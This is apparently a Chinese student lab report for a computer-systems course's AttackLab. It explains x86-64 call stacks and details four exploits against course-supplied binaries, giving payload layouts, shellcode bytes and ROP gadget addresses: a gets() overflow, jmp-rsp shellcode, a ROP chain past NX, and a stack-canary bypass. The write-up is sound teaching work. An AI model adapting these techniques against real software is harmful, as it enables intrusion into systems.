# 计算机系统基础 Lab3：AttackLab 实验报告

| 项目 | 内容 |
|---|---|
| 姓名 | Yutong Huang |
| 课程 | CS10005.02 计算机系统基础（2026 年秋季学期） |
| 实验环境 | Ubuntu Linux，x86-64，GDB 14，Python 3 |
| 完成日期 | 2026 年 11 月 27 日 |

## 摘要

本实验围绕 x86-64 调用栈、基于 `gets()` 的栈缓冲区溢出、代码执行保护、ASLR、
ROP 与 Stack Canary 展开。实验首先通过 GDB 观察函数调用时的 `rbp`、`rsp`、
返回地址和栈帧变化，随后分别完成四个利用任务：

1. 篡改 `dark-calc` 中 `input()` 的返回地址，执行同目录下的 `malware`；
2. 利用 `jmp rsp` 跳入栈上的 shellcode，调用 `grade_eval(4)`；
3. 在 NX 与 ASLR 开启的 `dark-calc-nx` 上构造 ROP 链；
4. 利用 `dark-log` 中可被覆盖的 `len` 字段，在不破坏 Canary 的情况下改写返回地址。

四个 payload 均已在提供的二进制上验证，输出分别包含自动评分要求的字符串。

## 一、实验环境与程序保护

实验在 x86-64 Linux 服务器上完成。服务器内核为 Linux 6.8，系统开启
`randomize_va_space=2`，因此普通进程的栈地址会随机变化。本题提供的可执行文件均为
**Non-PIE**，即代码段的虚拟地址固定；这一点使基于固定代码地址的跳转和 ROP 成为可能。

| 程序 | 类型 | 栈可执行（NX） | Canary | 用途 |
|---|---|---:|---:|---|
| `dark-calc` | ELF64 x86-64，Non-PIE | 是 | 否 | 栈溢出、栈执行 |
| `dark-calc-nx` | ELF64 x86-64，Non-PIE | 否 | 否 | ROP |
| `dark-log` | ELF64 x86-64，Non-PIE | 否 | 是 | Canary 绕过 |

`readelf -W -l` 显示 `dark-calc` 的 `GNU_STACK` 权限为 `RW`，同时操作系统允许该栈执行；
`dark-calc-nx` 与 `dark-log` 同样标记为 `RW`，但没有可执行权限，因此无法直接执行栈上的机器码。

## 二、程序的调用栈

### 2.1 `input()` 是谁调用的

`input()` 由 `dark-calc` 的 `main()` 调用。GDB 的 backtrace 为：

```text
#0  input () at 0x401977
#1  main () at 0x401ad1
```

`main()` 循环执行 `input(); eval();`，因此正常表达式输入完成后会回到 `main()` 继续下一轮。

### 2.2 `input()` 的序言

在 `0x401977` 处，`input()` 的前三条指令是：

```asm
401977: 55                    push rbp
401978: 48 89 e5              mov  rbp,rsp
40197b: 48 83 ec 10           sub  rsp,0x10
```

- `push rbp` 保存调用者 `main()` 的栈帧基址，并把 `rsp` 向下移动 8 字节。
- `mov rbp,rsp` 让当前函数的 `rbp` 指向新的栈帧基址。
- `sub rsp,0x10` 为 16 字节的局部数组 `expression[MAXLEN+1]` 分配空间。

GDB 中观察到的具体变化如下：

| 阶段 | `rsp` | `rbp` | `[rbp]` 和 `[rbp+8]` |
|---|---|---|---|
| 进入 `input()` 前 | `0x721000800fe8` | `0x721000800ff0` | 返回地址 `0x401ad1` 位于栈顶 |
| 执行 `push rbp` 后 | `0x721000800fe0` | `0x721000800ff0` | 保存了 main 的旧 `rbp` |
| 执行 `mov rbp,rsp` 后 | `0x721000800fe0` | `0x721000800fe0` | `[rbp]=main` 的旧 `rbp` |
| 执行 `sub rsp,0x10` 后 | `0x721000800fd0` | `0x721000800fe0` | `[rbp+8]=0x401ad1` |

因此，`[rbp]` 中的值来自 `main()` 的 `rbp`。该值由 `input()` 的第一条 `push rbp` 保存。

### 2.3 `[rbp+8]` 中的返回地址

`[rbp+8]` 中是 `0x401ad1`，即 `main()` 中调用 `input()` 的下一条指令：

```asm
401acc: e8 a6 fe ff ff        call 401977 <input>
401ad1: b8 00 00 00 00        mov  eax,0x0
```

这个值并不是 `input()` 的序言写入的，而是 `call input` 在执行时由硬件自动压栈。
`call` 会把下一条指令地址 `0x401ad1` 放到栈顶，再跳到 `input()`。

### 2.4 `call`、序言、`leave` 与 `ret`

- `call` 保存下一条指令地址并跳转到被调函数；
- 函数序言保存旧 `rbp`、建立新 `rbp`，再为局部变量调整 `rsp`；
- `leave` 等价于 `mov rsp,rbp; pop rbp`，用于恢复调用者的栈帧；
- `ret` 从当前 `rsp` 取出返回地址并跳回调用者。

当 `input()` 执行 `leave; ret` 时，`rsp` 先恢复到 `rbp+8`，随后 `ret` 弹出
`0x401ad1`，控制流回到 `main()`。

## 三、栈缓冲区溢出观察

`input()` 使用已废弃且不检查长度的 `gets(expression)`。`expression` 只有 16 字节，
但 `gets()` 会一直写入到换行符或文件结尾，因此输入可以覆盖缓冲区高地址方向的：

```text
[rbp-0x10]  expression[16]       低地址
[rbp+0x00]  saved rbp
[rbp+0x08]  return address       高地址
```

分别输入 20 和 32 个 ASCII 字符时观察到：

| 输入字符数 | 溢出范围 | 观察结果 |
|---:|---|---|
| 20 | 到达并部分覆盖 saved `rbp` | 程序仍可继续循环，说明返回地址尚未被破坏 |
| 32 | 完整覆盖 saved `rbp` 和返回地址 | 返回时跳到无效地址，进程收到 `SIGSEGV` |

32 字节输入结束后的终止 NUL 还会再写 1 字节，因此实际写入量为 33 字节。
这正是本题要求利用的“向高地址覆盖保存的返回地址”的溢出路径。

## 四、利用缓冲区漏洞执行 `./malware`

### 4.1 目标

`dark-calc` 的 `input()` 会把输入字符串复制到全局变量 `command_buf`。`eval()` 随后用
`system()` 执行拼接后的计算表达式。本题需要跳过正常拼接，让 `system()` 执行
`./malware`。

### 4.2 Payload 布局

`payload.py` 生成的内容如下：

| 偏移 | 内容 | 作用 |
|---:|---|---|
| `0x00` | `./malware\0` | 写入全局 `command_buf` 的命令 |
| `0x0a` | 6 个填充字节 | 填满 16 字节局部缓冲区 |
| `0x10` | 8 个 `B` | 覆盖 saved `rbp` |
| `0x18` | `0x401a6b` | 覆盖 `input()` 的返回地址 |

`0x401a6b` 位于 `eval()` 内部：

```asm
401a6b: bf d0 30 60 00        mov edi,0x6030d0
401a70: e8 6b fd ff ff        call system@plt
```

`0x6030d0` 正是 `command_buf` 的地址。因此返回后不需要人工设置 `rdi`，程序本身会把
`rdi` 指向命令字符串，然后调用 `system()`。

### 4.3 验证结果

```text
You have successfully detonated the bomb! Congratulations!
```

`system("./malware")` 返回后，由于 saved `rbp` 已被故意覆盖，进程可能以异常信号结束；
但 bomb 已经在异常发生前成功触发，满足评分条件。

## 五、机器码在内存中的排列

`main()` 的前三条指令是：

```asm
401ac3: 55                    push rbp
401ac4: 48 89 e5              mov  rbp,rsp
401ac7: b8 00 00 00 00        mov eax,0x0
```

对应机器码与内存区间为：

| 指令 | 机器码 | 内存区间 |
|---|---|---|
| `push rbp` | `55` | `0x401ac3` 至 `0x401ac3` |
| `mov rbp,rsp` | `48 89 e5` | `0x401ac4` 至 `0x401ac6` |
| `mov eax,0` | `b8 00 00 00 00` | `0x401ac7` 至 `0x401acb` |

指令以连续字节的形式存放在可执行的代码页中，多字节立即数按小端序排列。
CPU 执行时由 `rip` 指向当前指令；例如执行第一条前 `rip=0x401ac3`，执行后指向
`0x401ac4`。

## 六、栈空间执行与 `jmp rsp`

`dark-calc` 的栈可执行，但 Linux 默认开启 ASLR，栈上缓冲区的绝对地址每次运行都可能
不同。如果把 GDB 中看到的地址硬编码进 payload，脱离 GDB 后运行可能失败。

本实验采用已有的 `jmp rsp` gadget：`0x401e0b`。将 `input()` 的返回地址覆盖为该地址后，
`jmp rsp` 会跳到当前栈指针处，也就是 payload 中返回地址之后的 shellcode。

### 6.1 Shellcode

```text
6a 04              push 4
5f                 pop rdi
68 80 19 40 00     push 0x401880 (exit@plt)
68 87 1a 40 00     push 0x401a87 (grade_eval)
c3                 ret
```

前三条有效操作通过栈把整数 4 放入 `rdi`，符合 x86-64 第一参数寄存器约定。
随后把目标函数地址压栈，并用 `ret` 将控制流交给 `grade_eval()`。

### 6.2 Payload 布局

```text
16 字节 A | 8 字节 saved rbp | 0x401e0b | 14 字节 shellcode
```

### 6.3 ASLR 观察

将 `src/aslr.c` 编译后连续运行 5 次，变量地址均发生变化：

```text
0x7ffc4cc4d634
0x7fff224eae94
0x7ffc0fdd1d94
0x7ffe699bbd24
0x7ffd58b76434
```

这验证了使用固定栈地址不可靠。`jmp rsp` 不需要知道栈的绝对地址，而是利用当前寄存器中的
运行时值完成跳转，因此能够适配 ASLR。

### 6.4 验证结果

```text
Hope A will be your grade!
```

输出出现后进程因故意破坏的栈帧而异常退出，但目标分支已经执行。

## 七、ROP

`dark-calc-nx` 的栈不可执行，因此不能执行栈上的 shellcode。不过该程序是 Non-PIE，
代码段地址固定，可以从已有机器码中寻找 `ret` 结尾的短指令序列。

在题目提示的范围内找到：

```asm
401a33: 5f        pop rdi
401a34: c3        ret
```

`0x401a33` 实际上是 `pop r15; ret` 指令第二个字节开始的一条非对齐 gadget。
因此 ROP 链为：

```text
16 字节填充
8 字节 saved rbp
0x401a33        pop rdi; ret
0x0000000000000004
0x401978        grade_eval
```

执行过程：

1. `input()` 的 `ret` 跳到 `0x401a33`；
2. `pop rdi` 从栈上取出 4；
3. `ret` 跳到 `grade_eval`；
4. `grade_eval(4)` 打印目标字符串。

验证结果：

```text
Hope A will be your grade!
```

本次环境中该链成功运行。题目也提示部分 glibc 版本可能因 `printf` 内部栈对齐而崩溃；
如果遇到该问题，可以在调用 `grade_eval` 前插入一个单独的 `ret` gadget 调整 16 字节栈对齐。

## 八、绕过 Stack Canary

### 8.1 栈布局

`dark-log` 的 `input()` 栈帧可表示为：

| 相对 `expression` 的偏移 | 字段 | 大小 |
|---:|---|---:|
| `0x000` | `expression` | 128 字节 |
| `0x080` | `logMsg` | 128 字节 |
| `0x100` | `len` | 4 字节 |
| `0x108` | `pad` | 8 字节 |
| `0x118` | Canary | 8 字节 |
| `0x120` | saved `rbp` | 8 字节 |
| `0x128` | return address | 8 字节 |

程序先调用 `gets(f.expression)`，随后执行：

```c
memcpy(f.logMsg + f.len, f.expression, sizeof(f.expression));
```

其中 `f.len` 初始为 0，但我们可以在 `gets()` 阶段覆盖它。

### 8.2 利用原理

`expression` 距离 `len` 有 `0x100=256` 字节。payload 在偏移 `0x100` 写入
`len=0xA8`，并在此之前结束有效攻击链；`gets()` 写入的终止 NUL 位于 Canary 之前，
因此 Canary 没有被修改。

随后 `memcpy()` 的目标地址为：

```text
expression + 0x80 + 0xA8 = expression + 0x128
```

也就是 saved return address。于是 `memcpy()` 会把 payload 开头 128 字节复制到：

```text
0x401526        ret（栈对齐）
0x4018a3        pop rdi; ret
0x0000000000000004
0x401677        grade_eval
```

函数返回前检查 Canary；由于原值完好，检查通过。`leave; ret` 随后进入 ROP 链，
调用 `grade_eval(4)`。验证结果为：

```text
Hope A will be your grade!
```

### 8.3 如何重新排列局部变量

可以将 `len` 和 `pad` 放到较低的地址，把两个字符数组放到结构体末尾：

```c
struct safer_log_frame {
  int len;
  char pad[8];
  char expression[128];
  char logMsg[128];
};
```

原因是 `gets()` 的越界写只向高地址增长。`len` 位于缓冲区之前时，输入溢出无法修改它，
因此 `memcpy()` 的目标始终受控，不能向后跳到返回地址。固定数组仍然会威胁 Canary，
但直接覆盖 Canary 会被 Stack Protector 检测出来。

## 九、验证与结论

四个生成的 payload 均通过实际运行验证：

| Payload | 目标 | 预期输出 | 结果 |
|---|---|---|---|
| `payload.py` | `dark-calc` | bomb triggered | 通过 |
| `payload_dark.py` | `dark-calc` | `Hope A will be your grade!` | 通过 |
| `payload_rop.py` | `dark-calc-nx` | `Hope A will be your grade!` | 通过 |
| `payload_canary.py` | `dark-log` | `Hope A will be your grade!` | 通过 |

本实验说明，安全不能只依赖单一机制。NX 阻止直接执行栈数据，但代码复用可以绕开它；
ASLR 提高固定跳转的难度，但程序中的间接跳转仍可能被利用；Canary 可以发现对返回区域的
直接覆盖，但若同一函数中存在能改写数据拷贝目标的可控字段，仍可能通过二次拷贝绕过它。
现代程序需要同时采用不可执行栈、ASLR、Stack Protector、安全 API、变量布局控制和
编译器加固等多层防御。
